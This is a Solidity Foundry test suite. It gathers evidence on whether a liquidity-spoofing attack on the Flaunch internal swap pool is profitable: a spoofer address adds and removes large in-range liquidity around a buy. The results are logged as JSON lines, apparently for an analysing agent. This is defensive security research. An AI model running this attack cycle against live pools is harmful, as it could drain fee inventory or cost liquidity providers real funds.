// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {console} from 'forge-std/console.sol';

import {IPoolManager} from '@uniswap/v4-core/src/interfaces/IPoolManager.sol';
import {StateLibrary} from '@uniswap/v4-core/src/libraries/StateLibrary.sol';
import {TickMath} from '@uniswap/v4-core/src/libraries/TickMath.sol';
import {Currency} from '@uniswap/v4-core/src/types/Currency.sol';
import {PoolIdLibrary} from '@uniswap/v4-core/src/types/PoolId.sol';
import {PoolKey} from '@uniswap/v4-core/src/types/PoolKey.sol';
import {ModifyLiquidityParams, SwapParams} from '@uniswap/v4-core/src/types/PoolOperation.sol';

import {PositionManager} from '@flaunch/PositionManager.sol';
import {TickFinder} from '@flaunch/types/TickFinder.sol';

import {IPositionManager} from '@flaunch-interfaces/IPositionManager.sol';

import {FlaunchTest} from '../FlaunchTest.sol';

/**
 * Evidence-gathering test suite for the InternalSwapPool spoof analysis. Each test
 * emits NDJSON-shaped lines via `console.log` so the parent agent can parse them out
 * of the forge -vv stdout.
 *
 * Hypotheses under test:
 *  H1: Pool sqrtPriceX96 does NOT change when ISP fully covers a buy swap
 *  H2: Pool sqrtPriceX96 DOES change when ISP only partially covers a buy swap
 *  H3: Spoofer's LP add/remove cycle nets to ~zero in the fully-covered case
 *  H4: Spoofer's LP add/remove cycle nets to a real loss in the partially-covered case
 *  H5: Buys drain pendingPoolFees.amount1 because ISP fires on buys
 *  H6: Sells accumulate pendingPoolFees.amount1 because ISP does NOT fire on sells
 */
contract IspAttackModelEvidence is FlaunchTest {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;
    using TickFinder for int24;

    address private buyer = makeAddr('buyer');
    address private seller = makeAddr('seller');
    address private liquiditySpoofer = makeAddr('liquidity-spoofer');

    int private constant BASE_POOL_LIQUIDITY = 10 ether;
    int private constant SPOOFED_IN_RANGE_LIQUIDITY = 1_000_000 ether;

    constructor() {
        _deployPlatform();
    }

    /* ------------------------------------------------------------------ *
     *  H1 + H3: ISP fully covers swap. Pool price unchanged. No IL.       *
     * ------------------------------------------------------------------ */
    function test_evidence_FullyCoveredAttackHasNoImpermanentLoss() public {
        (PoolKey memory poolKey, address memecoin) = _setupPoolWithFees(2 ether);

        deal(address(WETH), liquiditySpoofer, 10e27);
        deal(memecoin, liquiditySpoofer, 10e27);
        uint wethBefore = WETH.balanceOf(liquiditySpoofer);
        uint memeBefore = IERC20(memecoin).balanceOf(liquiditySpoofer);

        (uint160 priceBeforeAdd, int24 tickBeforeAdd) = _readSlot0(poolKey);
        _logPrice('H1', 'price_before_spoof_add', priceBeforeAdd, tickBeforeAdd);

        (int24 lower, int24 upper) = _addSpoofedLiquidity(poolKey, memecoin);

        (uint160 priceAfterAdd, int24 tickAfterAdd) = _readSlot0(poolKey);
        _logPrice('H1', 'price_after_spoof_add', priceAfterAdd, tickAfterAdd);

        uint memeOut = _runBuyAsAttacker(poolKey, 2 ether);
        _logUint('H1', 'attacker_meme_received', memeOut);

        (uint160 priceAfterSwap, int24 tickAfterSwap) = _readSlot0(poolKey);
        _logPrice('H1', 'price_after_swap', priceAfterSwap, tickAfterSwap);

        _removeSpoofedLiquidity(poolKey, lower, upper);

        (uint160 priceAfterRemove, int24 tickAfterRemove) = _readSlot0(poolKey);
        _logPrice('H1', 'price_after_spoof_remove', priceAfterRemove, tickAfterRemove);

        uint wethAfter = WETH.balanceOf(liquiditySpoofer);
        uint memeAfter = IERC20(memecoin).balanceOf(liquiditySpoofer);
        int wethDelta = int(wethAfter) - int(wethBefore);
        int memeDelta = int(memeAfter) - int(memeBefore);
        _logDelta('H3', 'attacker_full_cycle_delta', wethDelta, memeDelta);

        bool priceUnchanged = (priceAfterAdd == priceAfterSwap);
        _logBool('H1', 'price_unchanged_during_swap', priceUnchanged);
    }

    /* ------------------------------------------------------------------ *
     *  H2 + H4: ISP only partially covers. Pool price moves. IL hits.     *
     * ------------------------------------------------------------------ */
    function test_evidence_PartiallyCoveredAttackHasImpermanentLoss() public {
        (PoolKey memory poolKey, address memecoin) = _setupPoolWithFees(2 ether);

        deal(address(WETH), liquiditySpoofer, 10e27);
        deal(memecoin, liquiditySpoofer, 10e27);
        uint wethBefore = WETH.balanceOf(liquiditySpoofer);
        uint memeBefore = IERC20(memecoin).balanceOf(liquiditySpoofer);

        (int24 lower, int24 upper) = _addSpoofedLiquidity(poolKey, memecoin);

        (uint160 priceBefore, int24 tickBefore) = _readSlot0(poolKey);
        _logPrice('H2', 'price_before_swap', priceBefore, tickBefore);

        // Request 5 ether memecoin output but inventory is only 2 ether
        uint memeOut = _runBuyAsAttacker(poolKey, 5 ether);
        _logUint('H2', 'attacker_meme_received', memeOut);

        (uint160 priceAfter, int24 tickAfter) = _readSlot0(poolKey);
        _logPrice('H2', 'price_after_swap', priceAfter, tickAfter);

        _removeSpoofedLiquidity(poolKey, lower, upper);

        uint wethAfter = WETH.balanceOf(liquiditySpoofer);
        uint memeAfter = IERC20(memecoin).balanceOf(liquiditySpoofer);
        int wethDelta = int(wethAfter) - int(wethBefore);
        int memeDelta = int(memeAfter) - int(memeBefore);
        _logDelta('H4', 'attacker_full_cycle_delta', wethDelta, memeDelta);

        bool priceMoved = (priceBefore != priceAfter);
        _logBool('H2', 'price_moved_during_swap', priceMoved);
    }

    /* ------------------------------------------------------------------ *
     *  H5 + H6: How does inventory accrue under normal swap flow?         *
     * ------------------------------------------------------------------ */
    function test_evidence_InventoryAccrualUnderNormalSwapFlow() public {
        (PoolKey memory poolKey, address memecoin) = _setupPoolWithFees(0); // start from 0 inventory

        bool zeroForOne = _poolKeyZeroForOne(poolKey);
        uint160 ethToMemeLimit = zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1;
        uint160 memeToEthLimit = zeroForOne ? TickMath.MAX_SQRT_PRICE - 1 : TickMath.MIN_SQRT_PRICE + 1;

        deal(address(WETH), buyer, 100 ether);
        deal(memecoin, seller, 100 ether);

        _logUint('H5', 'inventory_initial', positionManager.poolFees(poolKey).amount1);

        // Cycle 1: buy 1 ETH worth of memecoin
        vm.startPrank(buyer);
        WETH.approve(address(poolSwap), type(uint).max);
        poolSwap.swap(poolKey, SwapParams({zeroForOne: zeroForOne, amountSpecified: -int(1 ether), sqrtPriceLimitX96: ethToMemeLimit}));
        vm.stopPrank();
        _logUint('H5', 'inventory_after_organic_buy_1', positionManager.poolFees(poolKey).amount1);

        // Cycle 2: sell 1 ether memecoin
        vm.startPrank(seller);
        IERC20(memecoin).approve(address(poolSwap), type(uint).max);
        poolSwap.swap(poolKey, SwapParams({zeroForOne: !zeroForOne, amountSpecified: -int(1 ether), sqrtPriceLimitX96: memeToEthLimit}));
        vm.stopPrank();
        _logUint('H6', 'inventory_after_organic_sell_1', positionManager.poolFees(poolKey).amount1);

        // Cycle 3: another sell
        vm.startPrank(seller);
        poolSwap.swap(poolKey, SwapParams({zeroForOne: !zeroForOne, amountSpecified: -int(1 ether), sqrtPriceLimitX96: memeToEthLimit}));
        vm.stopPrank();
        _logUint('H6', 'inventory_after_organic_sell_2', positionManager.poolFees(poolKey).amount1);

        // Cycle 4: a buy that should drain accumulated inventory via ISP
        vm.startPrank(buyer);
        poolSwap.swap(poolKey, SwapParams({zeroForOne: zeroForOne, amountSpecified: -int(1 ether), sqrtPriceLimitX96: ethToMemeLimit}));
        vm.stopPrank();
        _logUint('H5', 'inventory_after_organic_buy_2', positionManager.poolFees(poolKey).amount1);

        // Cycle 5: a few more sells to show steady accumulation
        for (uint i; i < 5; ++i) {
            vm.startPrank(seller);
            poolSwap.swap(poolKey, SwapParams({zeroForOne: !zeroForOne, amountSpecified: -int(1 ether), sqrtPriceLimitX96: memeToEthLimit}));
            vm.stopPrank();
        }
        _logUint('H6', 'inventory_after_5_more_sells', positionManager.poolFees(poolKey).amount1);

        // Cycle 6: a single buy after sustained sell pressure
        vm.startPrank(buyer);
        poolSwap.swap(poolKey, SwapParams({zeroForOne: zeroForOne, amountSpecified: -int(1 ether), sqrtPriceLimitX96: ethToMemeLimit}));
        vm.stopPrank();
        _logUint('H5', 'inventory_after_drain_buy', positionManager.poolFees(poolKey).amount1);
    }

    /* ------------------------------------------------------------------ *
     *  Helpers                                                            *
     * ------------------------------------------------------------------ */

    function _setupPoolWithFees(
        uint preSeededFeeInventory
    ) internal returns (PoolKey memory poolKey_, address memecoin_) {
        memecoin_ = positionManager.flaunch(
            IPositionManager.FlaunchParams(
                'name', 'symbol', 'https://token.gg/', 0, address(this), 50_00, 0, abi.encode(''), abi.encode(1_000)
            )
        );

        poolKey_ = positionManager.poolKey(memecoin_);
        _addLiquidityToPool(memecoin_, BASE_POOL_LIQUIDITY, false);

        if (preSeededFeeInventory > 0) {
            deal(memecoin_, address(this), preSeededFeeInventory);
            IERC20(memecoin_).transfer(address(positionManager), preSeededFeeInventory);
            positionManager.depositFeesMock(poolKey_, 0, preSeededFeeInventory);
        }
    }

    function _runBuyAsAttacker(
        PoolKey memory poolKey,
        uint memecoinOut
    ) internal returns (uint memeOutReceived_) {
        bool zeroForOne = _poolKeyZeroForOne(poolKey);
        uint160 sqrtPriceLimitX96 = zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1;

        address memecoin = zeroForOne ? Currency.unwrap(poolKey.currency1) : Currency.unwrap(poolKey.currency0);

        vm.startPrank(liquiditySpoofer);
        WETH.approve(address(poolSwap), type(uint).max);
        uint memeBefore = IERC20(memecoin).balanceOf(liquiditySpoofer);

        poolSwap.swap(
            poolKey, SwapParams({zeroForOne: zeroForOne, amountSpecified: int(memecoinOut), sqrtPriceLimitX96: sqrtPriceLimitX96})
        );

        memeOutReceived_ = IERC20(memecoin).balanceOf(liquiditySpoofer) - memeBefore;
        vm.stopPrank();
    }

    function _addSpoofedLiquidity(
        PoolKey memory poolKey,
        address memecoin
    ) internal returns (int24 lower_, int24 upper_) {
        (, int24 currentTick) = _readSlot0(poolKey);
        lower_ = currentTick.validTick(true);
        upper_ = lower_ + TICK_SPACING;

        vm.startPrank(liquiditySpoofer);
        WETH.approve(address(poolModifyPosition), type(uint).max);
        IERC20(memecoin).approve(address(poolModifyPosition), type(uint).max);

        poolModifyPosition.modifyLiquidity(
            poolKey, ModifyLiquidityParams({tickLower: lower_, tickUpper: upper_, liquidityDelta: SPOOFED_IN_RANGE_LIQUIDITY, salt: ''}), ''
        );

        vm.stopPrank();
    }

    function _removeSpoofedLiquidity(
        PoolKey memory poolKey,
        int24 lower_,
        int24 upper_
    ) internal {
        vm.startPrank(liquiditySpoofer);

        poolModifyPosition.modifyLiquidity(
            poolKey,
            ModifyLiquidityParams({tickLower: lower_, tickUpper: upper_, liquidityDelta: -SPOOFED_IN_RANGE_LIQUIDITY, salt: ''}),
            ''
        );

        vm.stopPrank();
    }

    function _readSlot0(
        PoolKey memory poolKey
    ) internal view returns (uint160 sqrtPriceX96_, int24 tick_) {
        (sqrtPriceX96_, tick_,,) = IPoolManager(address(poolManager)).getSlot0(poolKey.toId());
    }

    /* ------------------ Logging helpers (NDJSON-shaped) ------------------ */

    function _logPrice(
        string memory hypothesisId,
        string memory message,
        uint160 sqrtPriceX96,
        int24 tick
    ) internal pure {
        console.log(
            string.concat(
                '{"runId":"isp-evidence","hypothesisId":"',
                hypothesisId,
                '","message":"',
                message,
                '","data":{"sqrtPriceX96":"',
                _toString(uint(sqrtPriceX96)),
                '","tick":',
                _toString(int(tick)),
                '}}'
            )
        );
    }

    function _logUint(
        string memory hypothesisId,
        string memory message,
        uint value
    ) internal pure {
        console.log(
            string.concat(
                '{"runId":"isp-evidence","hypothesisId":"',
                hypothesisId,
                '","message":"',
                message,
                '","data":{"value":"',
                _toString(value),
                '"}}'
            )
        );
    }

    function _logBool(
        string memory hypothesisId,
        string memory message,
        bool value
    ) internal pure {
        console.log(
            string.concat(
                '{"runId":"isp-evidence","hypothesisId":"',
                hypothesisId,
                '","message":"',
                message,
                '","data":{"value":',
                value ? 'true' : 'false',
                '}}'
            )
        );
    }

    function _logDelta(
        string memory hypothesisId,
        string memory message,
        int wethDelta,
        int memeDelta
    ) internal pure {
        console.log(
            string.concat(
                '{"runId":"isp-evidence","hypothesisId":"',
                hypothesisId,
                '","message":"',
                message,
                '","data":{"wethDelta":"',
                _toString(wethDelta),
                '","memeDelta":"',
                _toString(memeDelta),
                '"}}'
            )
        );
    }

    function _toString(
        uint value
    ) internal pure returns (string memory) {
        if (value == 0) {
            return '0';
        }
        uint temp = value;
        uint digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function _toString(
        int value
    ) internal pure returns (string memory) {
        if (value == type(int).min) {
            return string.concat('-', _toString(uint(type(int).max) + 1));
        }
        if (value < 0) {
            return string.concat('-', _toString(uint(-value)));
        }
        return _toString(uint(value));
    }
}
